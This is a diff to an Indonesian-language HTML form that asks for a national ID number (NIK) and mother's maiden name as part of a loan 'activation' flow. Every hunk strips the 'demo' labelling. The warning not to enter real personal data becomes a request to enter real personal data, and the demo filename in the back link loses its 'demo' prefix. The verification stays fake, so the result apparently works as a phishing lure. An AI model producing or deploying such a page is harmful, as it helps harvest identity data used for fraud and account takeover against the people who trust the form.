@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Demo form verifikasi NIK dan nama ibu kandung" />
-  <title>Verifikasi Data — Demo</title>
+  <meta name="description" content=" form verifikasi NIK dan nama ibu kandung" />
+  <title>Verifikasi Data — </title>
 
   <style>
     :root {
@@ -387,7 +387,7 @@
     <section class="form-card">
       <div class="form-title">
         <h2>Informasi Identitas</h2>
-        <p>Gunakan data simulasi. Jangan memasukkan data pribadi asli pada halaman demo.</p>
+        <p>Gunakan data asli. Harap memasukkan data pribadi asli pada halaman .</p>
       </div>
 
       <form id="identityForm" novalidate>
@@ -414,7 +414,7 @@
               id="motherName"
               type="text"
               maxlength="60"
-              placeholder="Masukkan nama ibu demo"
+              placeholder="Masukkan nama ibu "
               autocomplete="off"
             />
             <span class="field-icon">♙</span>
@@ -482,13 +482,13 @@
 
       if (!isNikValid()) {
         message.style.color = "#c93434";
-        message.textContent = "NIK demo harus terdiri dari tepat 16 angka.";
+        message.textContent = "NIK  harus terdiri dari tepat 16 angka.";
         return;
       }
 
       if (!isNameValid()) {
         message.style.color = "#c93434";
-        message.textContent = "Nama ibu demo belum valid.";
+        message.textContent = "Nama ibu  belum valid.";
         return;
       }
 
@@ -497,14 +497,14 @@
 
       setTimeout(() => {
         message.style.color = "#11865a";
-        message.textContent = "Data demo berhasil diverifikasi.";
+        message.textContent = "Data berhasil diverifikasi.";
         continueButton.textContent = "LANJUTKAN →";
         continueButton.disabled = false;
       }, 900);
     });
 
     backButton.addEventListener("click", () => {
-      window.location.href = "demo-aktivasi-pinjaman-terhubung.html";
+      window.location.href = "aktivasi-pinjaman-terhubung.html";
     });
   </script>
 </body>
